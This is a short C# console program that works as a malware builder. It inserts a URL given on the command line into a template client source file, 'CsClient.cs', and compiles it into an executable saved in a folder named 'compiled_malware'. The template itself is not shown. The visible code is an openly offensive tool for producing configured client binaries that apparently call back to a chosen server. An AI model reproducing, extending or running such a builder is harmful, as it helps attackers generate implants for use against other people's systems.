using System.IO;
using System.Collections.Generic;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System;

namespace compiler_anzen
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = args[0];
            string filename = args[1];

            
            Console.WriteLine(url+filename);

            var csc = new CSharpCodeProvider();
            var parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" , "System.Net.dll", "system.dll" }, $@"{Directory.GetCurrentDirectory()}\compiled_malware\" + filename, true);
            parameters.GenerateExecutable = true;
            Console.WriteLine(File.ReadAllText($@"{Directory.GetCurrentDirectory()}\Ressources\CsClient.cs").Replace("%%URL%%", url));

            CompilerResults result = csc.CompileAssemblyFromSource(parameters, File.ReadAllText(Path.GetFullPath($@"{Directory.GetCurrentDirectory()}\Ressources\CsClient.cs")).Replace("%%URL%%", url));
        }
    }
}